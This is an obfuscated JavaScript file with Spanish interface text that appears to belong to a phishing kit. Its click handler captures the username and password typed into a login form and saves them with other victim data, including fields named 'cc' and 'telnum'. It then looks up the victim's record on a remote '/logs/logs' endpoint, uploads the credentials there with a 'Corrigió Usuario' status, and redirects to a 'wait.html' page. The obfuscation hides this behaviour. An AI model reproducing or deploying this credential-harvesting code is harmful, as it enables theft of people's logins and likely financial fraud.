const _0x389c60 = _0x16f1;
(function (_0x41aba7, _0x385544) {
  const _0x45dd0c = _0x16f1,
    _0x161833 = _0x41aba7();
  while (!![]) {
    try {
      const _0x798629 =
        (-parseInt(_0x45dd0c(0x180)) / 0x1) *
          (parseInt(_0x45dd0c(0x187)) / 0x2) +
        parseInt(_0x45dd0c(0x18a)) / 0x3 +
        -parseInt(_0x45dd0c(0x18f)) / 0x4 +
        (parseInt(_0x45dd0c(0x190)) / 0x5) *
          (parseInt(_0x45dd0c(0x192)) / 0x6) +
        -parseInt(_0x45dd0c(0x186)) / 0x7 +
        (-parseInt(_0x45dd0c(0x17d)) / 0x8) *
          (-parseInt(_0x45dd0c(0x185)) / 0x9) +
        (-parseInt(_0x45dd0c(0x181)) / 0xa) *
          (-parseInt(_0x45dd0c(0x184)) / 0xb);
      if (_0x798629 === _0x385544) break;
      else _0x161833["push"](_0x161833["shift"]());
    } catch (_0x1821bb) {
      _0x161833["push"](_0x161833["shift"]());
    }
  }
})(_0x1a1a, 0x5d23d);
function _0x1a1a() {
  const _0x444af0 = [
    "18wGpYAs",
    "getElementById",
    "/logs/logs",
    "info",
    "idreg",
    "setItem",
    "GET",
    "location",
    "txtPass",
    "reg",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "Usuario\x20actualizado",
    "stringify",
    "preventDefault",
    "error",
    "log",
    "href",
    "value",
    "/logs/logUser/",
    "77752epUkqN",
    "PUT",
    "json",
    "57XREvLz",
    "30KglnGq",
    "disabled",
    "metaInfo",
    "2478069MPyTQC",
    "63aokqKs",
    "5093256cXnMyZ",
    "9246OyCEmt",
    "focus",
    "addEventListener",
    "2277492zsdYqF",
    "statusText",
    "application/json",
    "user",
    "Usuario\x20encontrado",
    "809404kXuhTr",
    "119895njPodi",
    "telnum",
  ];
  _0x1a1a = function () {
    return _0x444af0;
  };
  return _0x1a1a();
}
function updateLS() {
  const _0x208562 = _0x16f1;
  LS[_0x208562(0x197)](_0x208562(0x195), JSON[_0x208562(0x176)](info));
}
const button = document[_0x389c60(0x193)]("btnUsuario"),
  userInput = document[_0x389c60(0x193)]("txtUsuario"),
  passInput = document[_0x389c60(0x193)](_0x389c60(0x172));
async function updateStatus() {
  const _0x5be940 = _0x389c60;
  button[_0x5be940(0x182)] = !![];
  const _0x251c81 = await fetch(url + _0x5be940(0x194), {
      method: _0x5be940(0x170),
      headers: { "Content-Type": _0x5be940(0x18c) },
    }),
    _0x22ddb6 = await _0x251c81[_0x5be940(0x17f)](),
    _0x1501f8 = [..._0x22ddb6];
  for (const _0x154a1d of _0x1501f8) {
    if (
      _0x154a1d[_0x5be940(0x173)] == info[_0x5be940(0x183)]["cc"] &&
      _0x154a1d["cl"] == info["metaInfo"][_0x5be940(0x191)]
    ) {
      console["log"](_0x5be940(0x18e));
      const _0x5420c9 = await fetch(
          url + _0x5be940(0x17c) + _0x154a1d[_0x5be940(0x196)],
          {
            method: _0x5be940(0x17e),
            headers: { "Content-Type": _0x5be940(0x18c) },
            body: JSON[_0x5be940(0x176)]({
              us: info["metaInfo"][_0x5be940(0x18d)],
              ps: info[_0x5be940(0x183)]["puser"],
              status: "Corrigió\x20Usuario",
            }),
          }
        ),
        _0x19d3cc = await _0x5420c9[_0x5be940(0x17f)]();
      _0x5420c9["ok"]
        ? console[_0x5be940(0x179)](_0x5be940(0x175))
        : console[_0x5be940(0x178)](
            "Error\x20al\x20actualizar\x20usuario:",
            _0x5420c9[_0x5be940(0x18b)]
          );
    }
  }
  (button[_0x5be940(0x182)] = ![]),
    (window[_0x5be940(0x171)][_0x5be940(0x17a)] = "wait.html");
}
function _0x16f1(_0x25f63f, _0xb55935) {
  const _0x1a1abd = _0x1a1a();
  return (
    (_0x16f1 = function (_0x16f1ba, _0x2c60ce) {
      _0x16f1ba = _0x16f1ba - 0x170;
      let _0x15f90b = _0x1a1abd[_0x16f1ba];
      return _0x15f90b;
    }),
    _0x16f1(_0x25f63f, _0xb55935)
  );
}
button[_0x389c60(0x189)]("click", async function (_0x3c0b71) {
  const _0x130df6 = _0x389c60;
  _0x3c0b71[_0x130df6(0x177)]();
  if (userInput[_0x130df6(0x17b)] == "" && passInput[_0x130df6(0x17b)] == "") {
    alert(_0x130df6(0x174)), userInput[_0x130df6(0x188)]();
    return;
  } else {
    var _0x254127 = userInput[_0x130df6(0x17b)],
      _0x19c7b3 = passInput["value"];
    (info[_0x130df6(0x183)][_0x130df6(0x18d)] = _0x254127),
      (info[_0x130df6(0x183)]["puser"] = _0x19c7b3),
      updateLS(),
      await updateStatus();
  }
});
